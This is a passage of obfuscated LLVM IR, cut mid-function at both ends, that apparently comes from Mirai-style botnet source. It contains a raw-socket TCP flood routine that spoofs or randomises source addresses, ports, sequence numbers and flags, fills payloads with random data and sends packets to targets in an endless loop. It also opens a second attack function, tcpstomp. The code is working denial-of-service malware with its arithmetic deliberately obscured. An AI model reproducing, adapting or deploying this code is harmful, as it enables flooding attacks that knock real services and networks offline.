  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %644

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %644

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %445, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %452

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 15, -1
  %145 = xor i8 %143, %144
  %146 = and i8 %145, %143
  %147 = and i8 %143, 15
  %148 = and i8 %146, 64
  %149 = xor i8 %146, 64
  %150 = or i8 %148, %149
  %151 = or i8 %146, 64
  store i8 %150, i8* %142, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = xor i8 %154, -1
  %156 = xor i8 -16, -1
  %157 = xor i8 -69, -1
  %158 = or i8 %155, %156
  %159 = or i8 -69, %157
  %160 = xor i8 %158, -1
  %161 = and i8 %160, %159
  %162 = and i8 %154, -16
  %163 = and i8 %161, 5
  %164 = xor i8 %161, 5
  %165 = or i8 %163, %164
  %166 = or i8 %161, 5
  store i8 %165, i8* %153, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %26, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 40, -2344983930029673058
  %173 = add i64 %172, %171
  %174 = sub i64 %173, -2344983930029673058
  %175 = add i64 40, %171
  %176 = trunc i64 %174 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  %180 = load i16, i16* %13, align 2
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 3
  store i16 %181, i16* %183, align 4
  %184 = load i8, i8* %14, align 1
  %185 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 5
  store i8 %184, i8* %186, align 4
  %187 = load i8, i8* %15, align 1
  %188 = icmp ne i8 %187, 0
  br i1 %188, label %189, label %193

; <label>:189:                                    ; preds = %123
  %190 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 4
  store i16 %190, i16* %192, align 2
  br label %193

; <label>:193:                                    ; preds = %189, %123
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 6
  store i8 6, i8* %195, align 1
  %196 = load i32, i32* %28, align 4
  %197 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 8
  store i32 %196, i32* %198, align 4
  %199 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 1
  %204 = load i32, i32* %203, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 9
  store i32 %204, i32* %206, align 4
  %207 = load i16, i16* %16, align 2
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  store i16 %208, i16* %210, align 4
  %211 = load i16, i16* %17, align 2
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 1
  store i16 %212, i16* %214, align 2
  %215 = load i32, i32* %18, align 4
  %216 = trunc i32 %215 to i16
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = zext i16 %217 to i32
  %219 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 2
  store i32 %218, i32* %220, align 4
  %221 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = xor i16 -241, -1
  %225 = xor i16 %223, %224
  %226 = and i16 %225, %223
  %227 = and i16 %223, -241
  %228 = xor i16 %226, -1
  %229 = xor i16 80, -1
  %230 = xor i16 -24767, -1
  %231 = and i16 %228, -24767
  %232 = and i16 %226, %230
  %233 = and i16 %229, -24767
  %234 = and i16 80, %230
  %235 = or i16 %231, %232
  %236 = or i16 %233, %234
  %237 = xor i16 %235, %236
  %238 = or i16 %228, %229
  %239 = xor i16 %238, -1
  %240 = or i16 -24767, %230
  %241 = and i16 %239, %240
  %242 = or i16 %237, %241
  %243 = or i16 %226, 80
  store i16 %242, i16* %222, align 4
  %244 = load i8, i8* %20, align 1
  %245 = sext i8 %244 to i16
  %246 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 4
  %248 = load i16, i16* %247, align 4
  %249 = xor i16 %245, -1
  %250 = xor i16 1, -1
  %251 = xor i16 -25872, -1
  %252 = or i16 %249, %250
  %253 = or i16 -25872, %251
  %254 = xor i16 %252, -1
  %255 = and i16 %254, %253
  %256 = and i16 %245, 1
  %257 = shl i16 %255, 13
  %258 = xor i16 -8193, -1
  %259 = xor i16 %248, %258
  %260 = and i16 %259, %248
  %261 = and i16 %248, -8193
  %262 = xor i16 %260, -1
  %263 = xor i16 %257, -1
  %264 = xor i16 7842, -1
  %265 = and i16 %262, 7842
  %266 = and i16 %260, %264
  %267 = and i16 %263, 7842
  %268 = and i16 %257, %264
  %269 = or i16 %265, %266
  %270 = or i16 %267, %268
  %271 = xor i16 %269, %270
  %272 = or i16 %262, %263
  %273 = xor i16 %272, -1
  %274 = or i16 7842, %264
  %275 = and i16 %273, %274
  %276 = or i16 %271, %275
  %277 = or i16 %260, %257
  store i16 %276, i16* %247, align 4
  %278 = load i8, i8* %21, align 1
  %279 = sext i8 %278 to i16
  %280 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = xor i16 1, -1
  %284 = xor i16 %279, %283
  %285 = and i16 %284, %279
  %286 = and i16 %279, 1
  %287 = shl i16 %285, 12
  %288 = xor i16 -4097, -1
  %289 = xor i16 %282, %288
  %290 = and i16 %289, %282
  %291 = and i16 %282, -4097
  %292 = xor i16 %290, -1
  %293 = xor i16 %287, -1
  %294 = xor i16 -16494, -1
  %295 = and i16 %292, -16494
  %296 = and i16 %290, %294
  %297 = and i16 %293, -16494
  %298 = and i16 %287, %294
  %299 = or i16 %295, %296
  %300 = or i16 %297, %298
  %301 = xor i16 %299, %300
  %302 = or i16 %292, %293
  %303 = xor i16 %302, -1
  %304 = or i16 -16494, %294
  %305 = and i16 %303, %304
  %306 = or i16 %301, %305
  %307 = or i16 %290, %287
  store i16 %306, i16* %281, align 4
  %308 = load i8, i8* %22, align 1
  %309 = sext i8 %308 to i16
  %310 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 4
  %312 = load i16, i16* %311, align 4
  %313 = xor i16 1, -1
  %314 = xor i16 %309, %313
  %315 = and i16 %314, %309
  %316 = and i16 %309, 1
  %317 = shl i16 %315, 11
  %318 = xor i16 -2049, -1
  %319 = xor i16 %312, %318
  %320 = and i16 %319, %312
  %321 = and i16 %312, -2049
  %322 = and i16 %320, %317
  %323 = xor i16 %320, %317
  %324 = or i16 %322, %323
  %325 = or i16 %320, %317
  store i16 %324, i16* %311, align 4
  %326 = load i8, i8* %23, align 1
  %327 = sext i8 %326 to i16
  %328 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %329 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %328, i32 0, i32 4
  %330 = load i16, i16* %329, align 4
  %331 = xor i16 %327, -1
  %332 = xor i16 1, -1
  %333 = xor i16 -23472, -1
  %334 = or i16 %331, %332
  %335 = or i16 -23472, %333
  %336 = xor i16 %334, -1
  %337 = and i16 %336, %335
  %338 = and i16 %327, 1
  %339 = shl i16 %337, 10
  %340 = xor i16 -1025, -1
  %341 = xor i16 %330, %340
  %342 = and i16 %341, %330
  %343 = and i16 %330, -1025
  %344 = xor i16 %342, -1
  %345 = xor i16 %339, -1
  %346 = xor i16 -26614, -1
  %347 = and i16 %344, -26614
  %348 = and i16 %342, %346
  %349 = and i16 %345, -26614
  %350 = and i16 %339, %346
  %351 = or i16 %347, %348
  %352 = or i16 %349, %350
  %353 = xor i16 %351, %352
  %354 = or i16 %344, %345
  %355 = xor i16 %354, -1
  %356 = or i16 -26614, %346
  %357 = and i16 %355, %356
  %358 = or i16 %353, %357
  %359 = or i16 %342, %339
  store i16 %358, i16* %329, align 4
  %360 = load i8, i8* %24, align 1
  %361 = sext i8 %360 to i16
  %362 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %363 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %362, i32 0, i32 4
  %364 = load i16, i16* %363, align 4
  %365 = xor i16 %361, -1
  %366 = xor i16 1, -1
  %367 = xor i16 13969, -1
  %368 = or i16 %365, %366
  %369 = or i16 13969, %367
  %370 = xor i16 %368, -1
  %371 = and i16 %370, %369
  %372 = and i16 %361, 1
  %373 = shl i16 %371, 9
  %374 = xor i16 -513, -1
  %375 = xor i16 %364, %374
  %376 = and i16 %375, %364
  %377 = and i16 %364, -513
  %378 = xor i16 %376, -1
  %379 = xor i16 %373, -1
  %380 = xor i16 9202, -1
  %381 = and i16 %378, 9202
  %382 = and i16 %376, %380
  %383 = and i16 %379, 9202
  %384 = and i16 %373, %380
  %385 = or i16 %381, %382
  %386 = or i16 %383, %384
  %387 = xor i16 %385, %386
  %388 = or i16 %378, %379
  %389 = xor i16 %388, -1
  %390 = or i16 9202, %380
  %391 = and i16 %389, %390
  %392 = or i16 %387, %391
  %393 = or i16 %376, %373
  store i16 %392, i16* %363, align 4
  %394 = load i8, i8* %25, align 1
  %395 = sext i8 %394 to i16
  %396 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 4
  %398 = load i16, i16* %397, align 4
  %399 = xor i16 1, -1
  %400 = xor i16 %395, %399
  %401 = and i16 %400, %395
  %402 = and i16 %395, 1
  %403 = shl i16 %401, 8
  %404 = xor i16 %398, -1
  %405 = xor i16 -257, -1
  %406 = xor i16 1204, -1
  %407 = or i16 %404, %405
  %408 = or i16 1204, %406
  %409 = xor i16 %407, -1
  %410 = and i16 %409, %408
  %411 = and i16 %398, -257
  %412 = and i16 %410, %403
  %413 = xor i16 %410, %403
  %414 = or i16 %412, %413
  %415 = or i16 %410, %403
  store i16 %414, i16* %397, align 4
  %416 = call i32 @rand_next()
  %417 = xor i32 %416, -1
  %418 = xor i32 65535, -1
  %419 = xor i32 -38781319, -1
  %420 = or i32 %417, %418
  %421 = or i32 -38781319, %419
  %422 = xor i32 %420, -1
  %423 = and i32 %422, %421
  %424 = and i32 %416, 65535
  %425 = trunc i32 %423 to i16
  %426 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 5
  store i16 %425, i16* %427, align 2
  %428 = load i8, i8* %22, align 1
  %429 = icmp ne i8 %428, 0
  br i1 %429, label %430, label %442

; <label>:430:                                    ; preds = %193
  %431 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 4
  %433 = load i16, i16* %432, align 4
  %434 = xor i16 -2049, -1
  %435 = xor i16 %433, %434
  %436 = and i16 %435, %433
  %437 = and i16 %433, -2049
  %438 = and i16 %436, 2048
  %439 = xor i16 %436, 2048
  %440 = or i16 %438, %439
  %441 = or i16 %436, 2048
  store i16 %440, i16* %432, align 4
  br label %442

; <label>:442:                                    ; preds = %430, %193
  %443 = load i8*, i8** %31, align 8
  %444 = load i32, i32* %26, align 4
  call void @rand_str(i8* %443, i32 %444)
  br label %445

; <label>:445:                                    ; preds = %442
  %446 = load i32, i32* %9, align 4
  %447 = sub i32 0, %446
  %448 = sub i32 0, 1
  %449 = add i32 %447, %448
  %450 = sub i32 0, %449
  %451 = add nsw i32 %446, 1
  store i32 %450, i32* %9, align 4
  br label %118

; <label>:452:                                    ; preds = %118
  br label %453

; <label>:453:                                    ; preds = %643, %452
  store i32 0, i32* %9, align 4
  br label %454

; <label>:454:                                    ; preds = %637, %453
  %455 = load i32, i32* %9, align 4
  %456 = load i8, i8* %5, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp slt i32 %455, %457
  br i1 %458, label %459, label %643

; <label>:459:                                    ; preds = %454
  %460 = load i8**, i8*** %11, align 8
  %461 = load i32, i32* %9, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds i8*, i8** %460, i64 %462
  %464 = load i8*, i8** %463, align 8
  store i8* %464, i8** %32, align 8
  %465 = load i8*, i8** %32, align 8
  %466 = bitcast i8* %465 to %struct.iphdr*
  store %struct.iphdr* %466, %struct.iphdr** %33, align 8
  %467 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i64 1
  %469 = bitcast %struct.iphdr* %468 to %struct.tcphdr*
  store %struct.tcphdr* %469, %struct.tcphdr** %34, align 8
  %470 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i64 1
  %472 = bitcast %struct.tcphdr* %471 to i8*
  store i8* %472, i8** %35, align 8
  %473 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %474 = load i32, i32* %9, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 2
  %478 = load i8, i8* %477, align 4
  %479 = zext i8 %478 to i32
  %480 = icmp slt i32 %479, 32
  br i1 %480, label %481, label %504

; <label>:481:                                    ; preds = %459
  %482 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %483 = load i32, i32* %9, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i64 %484
  %486 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %485, i32 0, i32 1
  %487 = load i32, i32* %486, align 4
  %488 = call i32 @ntohl(i32 %487) #7
  %489 = call i32 @rand_next()
  %490 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %491 = load i32, i32* %9, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i64 %492
  %494 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i32 0, i32 2
  %495 = load i8, i8* %494, align 4
  %496 = zext i8 %495 to i32
  %497 = lshr i32 %489, %496
  %498 = sub i32 0, %497
  %499 = sub i32 %488, %498
  %500 = add i32 %488, %497
  %501 = call i32 @htonl(i32 %499) #7
  %502 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 9
  store i32 %501, i32* %503, align 4
  br label %504

; <label>:504:                                    ; preds = %481, %459
  %505 = load i32, i32* %28, align 4
  %506 = icmp eq i32 %505, -1
  br i1 %506, label %507, label %511

; <label>:507:                                    ; preds = %504
  %508 = call i32 @rand_next()
  %509 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 8
  store i32 %508, i32* %510, align 4
  br label %511

; <label>:511:                                    ; preds = %507, %504
  %512 = load i16, i16* %13, align 2
  %513 = zext i16 %512 to i32
  %514 = icmp eq i32 %513, 65535
  br i1 %514, label %515, label %528

; <label>:515:                                    ; preds = %511
  %516 = call i32 @rand_next()
  %517 = xor i32 %516, -1
  %518 = xor i32 65535, -1
  %519 = xor i32 447553751, -1
  %520 = or i32 %517, %518
  %521 = or i32 447553751, %519
  %522 = xor i32 %520, -1
  %523 = and i32 %522, %521
  %524 = and i32 %516, 65535
  %525 = trunc i32 %523 to i16
  %526 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 3
  store i16 %525, i16* %527, align 4
  br label %528

; <label>:528:                                    ; preds = %515, %511
  %529 = load i16, i16* %16, align 2
  %530 = zext i16 %529 to i32
  %531 = icmp eq i32 %530, 65535
  br i1 %531, label %532, label %541

; <label>:532:                                    ; preds = %528
  %533 = call i32 @rand_next()
  %534 = xor i32 65535, -1
  %535 = xor i32 %533, %534
  %536 = and i32 %535, %533
  %537 = and i32 %533, 65535
  %538 = trunc i32 %536 to i16
  %539 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 0
  store i16 %538, i16* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %532, %528
  %542 = load i16, i16* %17, align 2
  %543 = zext i16 %542 to i32
  %544 = icmp eq i32 %543, 65535
  br i1 %544, label %545, label %558

; <label>:545:                                    ; preds = %541
  %546 = call i32 @rand_next()
  %547 = xor i32 %546, -1
  %548 = xor i32 65535, -1
  %549 = xor i32 1887929275, -1
  %550 = or i32 %547, %548
  %551 = or i32 1887929275, %549
  %552 = xor i32 %550, -1
  %553 = and i32 %552, %551
  %554 = and i32 %546, 65535
  %555 = trunc i32 %553 to i16
  %556 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 1
  store i16 %555, i16* %557, align 2
  br label %558

; <label>:558:                                    ; preds = %545, %541
  %559 = load i32, i32* %18, align 4
  %560 = icmp eq i32 %559, 65535
  br i1 %560, label %561, label %565

; <label>:561:                                    ; preds = %558
  %562 = call i32 @rand_next()
  %563 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %564 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %563, i32 0, i32 2
  store i32 %562, i32* %564, align 4
  br label %565

; <label>:565:                                    ; preds = %561, %558
  %566 = load i32, i32* %19, align 4
  %567 = icmp eq i32 %566, 65535
  br i1 %567, label %568, label %572

; <label>:568:                                    ; preds = %565
  %569 = call i32 @rand_next()
  %570 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 3
  store i32 %569, i32* %571, align 4
  br label %572

; <label>:572:                                    ; preds = %568, %565
  %573 = load i8, i8* %27, align 1
  %574 = icmp ne i8 %573, 0
  br i1 %574, label %575, label %578

; <label>:575:                                    ; preds = %572
  %576 = load i8*, i8** %35, align 8
  %577 = load i32, i32* %26, align 4
  call void @rand_str(i8* %576, i32 %577)
  br label %578

; <label>:578:                                    ; preds = %575, %572
  %579 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 7
  store i16 0, i16* %580, align 2
  %581 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %582 = bitcast %struct.iphdr* %581 to i16*
  %583 = call zeroext i16 @checksum_generic(i16* %582, i32 20)
  %584 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %585 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %584, i32 0, i32 7
  store i16 %583, i16* %585, align 2
  %586 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 6
  store i16 0, i16* %587, align 4
  %588 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %589 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %590 = bitcast %struct.tcphdr* %589 to i8*
  %591 = load i32, i32* %26, align 4
  %592 = sext i32 %591 to i64
  %593 = sub i64 0, 20
  %594 = sub i64 0, %592
  %595 = add i64 %593, %594
  %596 = sub i64 0, %595
  %597 = add i64 20, %592
  %598 = trunc i64 %596 to i16
  %599 = call zeroext i16 @htons(i16 zeroext %598) #7
  %600 = load i32, i32* %26, align 4
  %601 = sext i32 %600 to i64
  %602 = sub i64 20, -1127787433345537444
  %603 = add i64 %602, %601
  %604 = add i64 %603, -1127787433345537444
  %605 = add i64 20, %601
  %606 = trunc i64 %604 to i32
  %607 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %588, i8* %590, i16 zeroext %599, i32 %606)
  %608 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %609 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %608, i32 0, i32 6
  store i16 %607, i16* %609, align 4
  %610 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %611 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %610, i32 0, i32 1
  %612 = load i16, i16* %611, align 2
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %617, i32 0, i32 1
  store i16 %612, i16* %618, align 2
  %619 = load i32, i32* %10, align 4
  %620 = load i8*, i8** %32, align 8
  %621 = load i32, i32* %26, align 4
  %622 = sext i32 %621 to i64
  %623 = sub i64 40, 5931942678149363998
  %624 = add i64 %623, %622
  %625 = add i64 %624, 5931942678149363998
  %626 = add i64 40, %622
  %627 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %628 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %629 = load i32, i32* %9, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i64 %630
  %632 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i32 0, i32 0
  %633 = bitcast %struct.sockaddr_in* %632 to %struct.sockaddr*
  store %struct.sockaddr* %633, %struct.sockaddr** %627, align 8
  %634 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %635 = load %struct.sockaddr*, %struct.sockaddr** %634, align 8
  %636 = call i64 @sendto(i32 %619, i8* %620, i64 %625, i32 16384, %struct.sockaddr* %635, i32 16)
  br label %637

; <label>:637:                                    ; preds = %578
  %638 = load i32, i32* %9, align 4
  %639 = add i32 %638, -346524871
  %640 = add i32 %639, 1
  %641 = sub i32 %640, -346524871
  %642 = add nsw i32 %638, 1
  store i32 %641, i32* %9, align 4
  br label %454

; <label>:643:                                    ; preds = %454
  br label %453

; <label>:644:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
